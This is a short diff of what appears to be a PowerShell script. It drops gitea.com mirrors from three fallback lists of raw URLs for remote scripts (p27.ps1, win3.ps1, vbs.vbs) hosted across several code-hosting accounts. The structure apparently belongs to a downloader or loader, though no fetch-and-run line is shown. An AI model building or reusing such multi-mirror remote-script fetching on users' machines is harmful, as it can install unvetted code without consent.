@@ -21,7 +21,6 @@ if (-not (Test-Path $UserBase)) {
 
 # URLs (Multiple sources - fallback)
 $PUrls = @(
-    "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/p27.ps1"
     "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/p27.ps1"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/p27.ps1"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/p27.ps1"
@@ -29,14 +28,12 @@ $PUrls = @(
 )
 
 $WUrls = @(
-    "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/win3.ps1"
     "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/win3.ps1"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/win3.ps1"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/win3.ps1"
 
 )
 $VUrls = @(
-    "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/vbs.vbs"
     "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/vbs.vbs"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/vbs.vbs"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/vbs.vbs"
